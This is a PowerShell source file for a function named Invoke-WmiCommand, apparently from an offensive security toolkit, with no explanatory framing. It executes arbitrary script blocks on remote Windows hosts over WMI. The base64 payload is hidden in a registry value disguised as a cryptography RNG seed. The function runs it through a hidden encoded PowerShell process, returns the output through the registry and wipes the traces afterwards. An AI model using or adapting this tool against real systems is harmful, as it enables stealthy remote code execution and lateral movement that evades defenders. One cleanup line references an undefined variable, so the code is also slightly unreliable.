function Invoke-WmiCommand {


    [CmdletBinding()]
    Param (
        [Parameter( Mandatory = $True )]
        [ScriptBlock]
        $Payload,

        [String]
        [ValidateSet( 'HKEY_LOCAL_MACHINE',
                      'HKEY_CURRENT_USER',
                      'HKEY_CLASSES_ROOT',
                      'HKEY_USERS',
                      'HKEY_CURRENT_CONFIG' )]
        $RegistryHive = 'HKEY_CURRENT_USER',

        [String]
        [ValidateNotNullOrEmpty()]
        $RegistryKeyPath = 'SOFTWARE\Microsoft\Cryptography\RNG',

        [String]
        [ValidateNotNullOrEmpty()]
        $RegistryPayloadValueName = 'Seed',

        [String]
        [ValidateNotNullOrEmpty()]
        $RegistryResultValueName = 'Value',

        [Parameter( ValueFromPipeline = $True )]
        [Alias('Cn')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Management.ImpersonationLevel]
        $Impersonation,

        [System.Management.AuthenticationLevel]
        $Authentication,

        [Switch]
        $EnableAllPrivileges,

        [String]
        $Authority
    )

    BEGIN {
        switch ($RegistryHive) {
            'HKEY_LOCAL_MACHINE' { $Hive = 2147483650 }
            'HKEY_CURRENT_USER' { $Hive = 2147483649 }
            'HKEY_CLASSES_ROOT' { $Hive = 2147483648 }
            'HKEY_USERS' { $Hive = 2147483651 }
            'HKEY_CURRENT_CONFIG' { $Hive = 2147483653 }
        }

        $HKEY_LOCAL_MACHINE = 2147483650

        $WmiMethodArgs = @{}

        
        if ($PSBoundParameters['Credential']) { $WmiMethodArgs['Credential'] = $Credential }
        if ($PSBoundParameters['Impersonation']) { $WmiMethodArgs['Impersonation'] = $Impersonation }
        if ($PSBoundParameters['Authentication']) { $WmiMethodArgs['Authentication'] = $Authentication }
        if ($PSBoundParameters['EnableAllPrivileges']) { $WmiMethodArgs['EnableAllPrivileges'] = $EnableAllPrivileges }
        if ($PSBoundParameters['Authority']) { $WmiMethodArgs['Authority'] = $Authority }

        $AccessPermissions = @{
            KEY_QUERY_VALUE = 1
            KEY_SET_VALUE = 2
            KEY_CREATE_SUB_KEY = 4
            KEY_CREATE = 32
            DELETE = 65536
        }

        
        $RequiredPermissions = $AccessPermissions['KEY_QUERY_VALUE'] -bor
                               $AccessPermissions['KEY_SET_VALUE'] -bor
                               $AccessPermissions['KEY_CREATE_SUB_KEY'] -bor
                               $AccessPermissions['KEY_CREATE'] -bor
                               $AccessPermissions['DELETE']
    }

    PROCESS {
        foreach ($Computer in $ComputerName) {
            
            $WmiMethodArgs['ComputerName'] = $Computer

            Write-Verbose "[$Computer] Creating the following registry key: $RegistryHive\$RegistryKeyPath"
            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'CreateKey' -ArgumentList $Hive, $RegistryKeyPath

            if ($Result.ReturnValue -ne 0) {
                throw "[$Computer] Unable to create the following registry key: $RegistryHive\$RegistryKeyPath"
            }

            Write-Verbose "[$Computer] Validating read/write/delete privileges for the following registry key: $RegistryHive\$RegistryKeyPath"
            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'CheckAccess' -ArgumentList $Hive, $RegistryKeyPath, $RequiredPermissions

            if (-not $Result.bGranted) {
                throw "[$Computer] You do not have permission to perform all the registry operations necessary for Invoke-WmiCommand."
            }

            $PSSettingsPath = 'SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell'
            $PSPathValueName = 'Path'

            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKEY_LOCAL_MACHINE, $PSSettingsPath, $PSPathValueName

            if ($Result.ReturnValue -ne 0) {
                throw "[$Computer] Unable to obtain powershell.exe path from the following registry value: HKEY_LOCAL_MACHINE\$PSSettingsPath\$PSPathValueName"
            }

            $PowerShellPath = $Result.sValue
            Write-Verbose "[$Computer] Full PowerShell path: $PowerShellPath"

            $EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Payload))

            Write-Verbose "[$Computer] Storing the payload into the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryPayloadValueName"
            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'SetStringValue' -ArgumentList $Hive, $RegistryKeyPath, $EncodedPayload, $RegistryPayloadValueName

            if ($Result.ReturnValue -ne 0) {
                throw "[$Computer] Unable to store the payload in the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryPayloadValueName"
            }

            
            $PayloadRunnerArgs = @"
                `$Hive = '$Hive'
                `$RegistryKeyPath = '$RegistryKeyPath'
                `$RegistryPayloadValueName = '$RegistryPayloadValueName'
                `$RegistryResultValueName = '$RegistryResultValueName'
                `n
"@

            $RemotePayloadRunner = $PayloadRunnerArgs + {
                $WmiMethodArgs = @{
                    Namespace = 'Root\default'
                    Class = 'StdRegProv'
                }

                $Result = Invoke-WmiMethod @WmiMethodArgs -Name 'GetStringValue' -ArgumentList $Hive, $RegistryKeyPath, $RegistryPayloadValueName

                if (($Result.ReturnValue -eq 0) -and ($Result.sValue)) {
                    $Payload = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($Result.sValue))

                    $TempSerializedResultPath = [IO.Path]::GetTempFileName()

                    $PayloadResult = Invoke-Expression ($Payload)

                    Export-Clixml -InputObject $PayloadResult -Path $TempSerializedResultPath

                    $SerilizedPayloadText = [IO.File]::ReadAllText($TempSerializedResultPath)

                    $null = Invoke-WmiMethod @WmiMethodArgs -Name 'SetStringValue' -ArgumentList $Hive, $RegistryKeyPath, $SerilizedPayloadText, $RegistryResultValueName

                    Remove-Item -Path $SerilizedPayloadResult -Force

                    $null = Invoke-WmiMethod @WmiMethodArgs -Name 'DeleteValue' -ArgumentList $Hive, $RegistryKeyPath, $RegistryPayloadValueName
                }
            }

            $Base64Payload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($RemotePayloadRunner))

            $Cmdline = "$PowerShellPath -WindowStyle Hidden -NoProfile -EncodedCommand $Base64Payload"

            
            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\cimv2' -Class 'Win32_Process' -Name 'Create' -ArgumentList $Cmdline

            Start-Sleep -Seconds 5

            if ($Result.ReturnValue -ne 0) {
                throw "[$Computer] Unable to execute payload stored within the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryPayloadValueName"
            }

            Write-Verbose "[$Computer] Payload successfully executed from: $RegistryHive\$RegistryKeyPath\$RegistryPayloadValueName"

            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $Hive, $RegistryKeyPath, $RegistryResultValueName

            if ($Result.ReturnValue -ne 0) {
                throw "[$Computer] Unable retrieve the payload results from the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryResultValueName"
            }

            Write-Verbose "[$Computer] Payload results successfully retrieved from: $RegistryHive\$RegistryKeyPath\$RegistryResultValueName"

            $SerilizedPayloadResult = $Result.sValue

            $TempSerializedResultPath = [IO.Path]::GetTempFileName()

            Out-File -InputObject $SerilizedPayloadResult -FilePath $TempSerializedResultPath
            $PayloadResult = Import-Clixml -Path $TempSerializedResultPath

            Remove-Item -Path $TempSerializedResultPath

            $FinalResult = New-Object PSObject -Property @{
                PSComputerName = $Computer
                PayloadOutput = $PayloadResult
            }

            Write-Verbose "[$Computer] Removing the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryResultValueName"
            $null = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'DeleteValue' -ArgumentList $Hive, $RegistryKeyPath, $RegistryResultValueName

            Write-Verbose "[$Computer] Removing the following registry key: $RegistryHive\$RegistryKeyPath"
            $null = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'DeleteKey' -ArgumentList $Hive, $RegistryKeyPath

            return $FinalResult
        }
    }
}
